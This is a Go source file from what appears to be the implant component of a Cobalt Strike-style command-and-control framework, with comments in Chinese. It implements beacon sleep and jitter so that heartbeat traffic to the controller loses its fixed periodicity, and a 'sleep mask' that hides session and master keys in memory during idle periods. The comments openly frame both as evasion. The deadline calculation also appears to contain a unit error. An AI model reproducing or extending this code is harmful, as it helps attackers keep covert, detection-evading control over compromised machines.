package app

import (
	"encoding/binary"
	"implant/core/config"
	"implant/core/encrypt"
	"math/rand"
	"time"
)

// 【统一心跳(CS 模型)】beacon 节奏单一事实来源 = config.WaitTime(sleep 秒) + jitter%。
// 心跳 ticker、轮询间隔、RecvDeadline 全部由下方函数派生：
//   - NextInterval():  sleep × (1 + U(-j%, +j%))，逐拍重算
//   - RecvDeadline():  2 × sleep × (1+j%) + 5s
//   - SLEEP 命令改 config.WaitTime 后，以上全部即时跟随

// jitterFraction 返回当前抖动比例（0-0.5，钳制）
func jitterFraction() float64 {
	jp := config.ReconnectConfig.JitterPercent
	if jp > config.ReconnectConfig.MaxJitterPercent {
		jp = config.ReconnectConfig.MaxJitterPercent
	}
	if jp < 0 {
		jp = 0
	}
	return float64(jp) / 100.0
}

// baseSleep 当前 sleep 基准（SLEEP 命令可运行时调整）；无效时回退 5s
func baseSleep() time.Duration {
	if config.WaitTime > 0 {
		return config.WaitTime
	}
	return 5 * time.Second
}

// NextInterval 下一拍间隔：sleep × (1 + U(-j%, +j%))。
// 心跳与轮询共用，打破固定周期流量特征（CS sleep+jitter 语义）。
func NextInterval() time.Duration {
	return Jittered(baseSleep())
}

// Jittered 对任意基准间隔施加当前抖动：d × (1 + U(-j%, +j%))
func Jittered(d time.Duration) time.Duration {
	if d <= 0 {
		d = 5 * time.Second
	}
	j := jitterFraction()
	if j <= 0 {
		return d
	}
	spread := float64(d) * j
	delta := (rand.Float64()*2 - 1) * spread
	out := d + time.Duration(delta)
	if out < 100*time.Millisecond {
		out = 100 * time.Millisecond
	}
	return out
}

// RecvDeadline 客户端单次 Recv 的读超时：2×最坏拍间隔 + 5s 余量。
// 服务端对每个心跳包回复 ack，健康连接读侧持续有数据，不会触发超时；
// 服务端静默死亡（黑洞网络，无 FIN/RST）时超时立即触发，重连而非永久卡死。
func RecvDeadline() time.Duration {
	worst := float64(baseSleep()) * (1 + jitterFraction())
	return time.Duration(2*worst)*time.Second + 5*time.Second
}

// HeartbeatLoop 心跳循环：每拍按 NextInterval() 重算间隔（jitter 参与心跳节奏），
// stop 关闭时退出。替代原固定间隔 ticker（流量周期性特征）。
func HeartbeatLoop(stop <-chan struct{}, send func()) {
	for {
		timer := time.NewTimer(NextInterval())
		select {
		case <-timer.C:
			send()
		case <-stop:
			timer.Stop()
			return
		}
	}
}

// IsHeartbeatAck 判断解密后的命令是否为心跳 ack（type=3 空载荷）：
// 仅作存活探测，非业务命令，应丢弃。
func IsHeartbeatAck(decrypted []byte) bool {
	return len(decrypted) == 4 && binary.BigEndian.Uint32(decrypted) == 3
}

// SleepWithJitter 按 config.WaitTime + 抖动休眠；WaitTime<=0 时随机休眠。
// 不做密钥遮蔽——需要遮蔽的空闲路径请用 SleepMaskedWithJitter / SleepMask。
func SleepWithJitter(r *rand.Rand) {
	if config.WaitTime > 0 {
		d := NextInterval()
		time.Sleep(d)
		return
	}
	time.Sleep(time.Duration(r.Intn(5000)) * time.Millisecond)
}

// SleepMaskedWithJitter 抖动休眠 + 密钥遮蔽（持久传输空闲路径）。
//
// 原实现只有轮询型传输走 mask，tcp/kcp/websocket/forward 这类**长连接**走的是
// 无遮蔽的 SleepWithJitter —— 而长连接的会话密钥在内存里驻留时间最长（数小时），
// 恰恰是最该保护的一类。这里统一到 mask 路径。
func SleepMaskedWithJitter(r *rand.Rand) {
	if config.WaitTime > 0 {
		SleepMask(NextInterval())
		return
	}
	SleepMask(time.Duration(r.Intn(5000)) * time.Millisecond)
}

// SleepMask 睡眠期间遮蔽全部密钥材料（B9 sleep mask）。
//
// 原实现取 GetSessionKey()（返回的是拷贝）再对拷贝做 XOR —— 真正的会话密钥
// 在管理器里原样躺着，遮蔽的是一个谁也看不到的局部变量：看着有 OPSEC，实际没有。
// 现在就地遮蔽真身（会话密钥/上一把/主密钥/盐 + 清空 AEAD 缓存），醒后还原并擦除 pad。
//
// 遮蔽按**不超过 maskSliceDuration 的片**进行，片与片之间重新判定是否有人要用密钥：
// 空闲时几乎全程遮蔽；一旦有会话开始收发，最多再多等一片就还原（而不是让对方的
// 收发等满整个睡眠周期）。这让"全传输遮蔽"不至于把实时隧道卡住。
func SleepMask(d time.Duration) {
	ckm := encrypt.GlobalClientKeyManager
	if ckm == nil || d <= 0 {
		time.Sleep(d)
		return
	}
	deadline := time.Now().Add(d)
	for {
		remaining := time.Until(deadline)
		if remaining <= 0 {
			return
		}
		slice := remaining
		if slice > maskSliceDuration {
			slice = maskSliceDuration
		}
		restore, masked := ckm.MaskForSleep()
		if !masked {
			time.Sleep(slice)
			continue
		}
		time.Sleep(slice)
		restore()
	}
}

// maskSliceDuration 单次遮蔽的最长时间（片长）。默认 2s：
// 有会话在遮蔽期间开始收发时，最多等这么久就能拿到密钥。
// 声明为变量便于测试缩短片长。
var maskSliceDuration = 2 * time.Second
